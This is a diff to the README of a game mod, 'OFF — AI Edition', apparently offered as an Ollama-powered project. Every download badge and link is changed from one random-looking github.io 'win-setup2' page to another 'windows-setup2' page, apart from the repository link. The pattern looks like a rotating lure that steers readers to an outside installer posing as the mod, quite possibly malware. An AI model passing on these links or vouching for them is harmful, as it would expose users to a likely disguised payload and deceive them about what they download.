@@ -2,9 +2,9 @@
 
 # OFF — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://fnwsiyggsoui.github.io/win-setup2/)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://fnwsiyggsoui.github.io/win-setup2/)
-[![Zones to purify](https://img.shields.io/badge/Zones-Purified-2a2a2a?style=for-the-badge)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![Zones to purify](https://img.shields.io/badge/Zones-Purified-2a2a2a?style=for-the-badge)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/substanceartisanstir/off-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/substanceartisanstir/off-ai-edition)
@@ -55,7 +55,7 @@ The mod's central mechanic is the one the game ends on. You are the player, the 
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://fnwsiyggsoui.github.io/win-setup2/)**
+- **[⬇ Download the latest version](https://vkbcfwqqceuz.github.io/windows-setup2/)**
 - [Repository](https://github.com/substanceartisanstir/off-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
